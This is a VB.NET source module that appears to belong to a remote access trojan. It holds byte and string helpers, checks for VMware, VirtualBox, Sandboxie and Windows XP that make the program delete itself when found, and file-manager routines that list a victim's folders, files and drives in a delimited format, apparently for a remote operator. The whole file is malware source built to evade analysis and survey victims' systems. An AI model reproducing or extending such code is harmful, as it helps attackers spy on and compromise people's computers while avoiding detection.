﻿
Module Func

    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New Collections.Generic.List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Sub VMware()
        On Error Resume Next
        If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
            Installation.DEL()
        End If
    End Sub

    Sub Virtualbox()
        On Error Resume Next
        If IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
            Installation.DEL()
        End If
    End Sub

    Sub Sandboxie()
        On Error Resume Next
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Installation.DEL()
        End If
    End Sub

    Sub Win_XP()
        If ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
            Installation.DEL()
        End If
    End Sub

    Public Function FMFolders(ByVal location) As String
        Dim di As New IO.DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As IO.DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "|SPL_FM||SPL_FM|"
        Next
        Return folders
    End Function
    Public Function FMFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "|SPL_FM|" & f.Length.ToString & "|SPL_FM|"
        Next
        Return files
    End Function

    Public Function FMDrives() As String
        Dim allDrives As String = ""
        For Each d As IO.DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "|SPL_FM||SPL_FM|"
                Case 5
                    allDrives += "[CD]" & d.Name & "|SPL_FM||SPL_FM|"
            End Select
        Next
        Return allDrives
    End Function


End Module
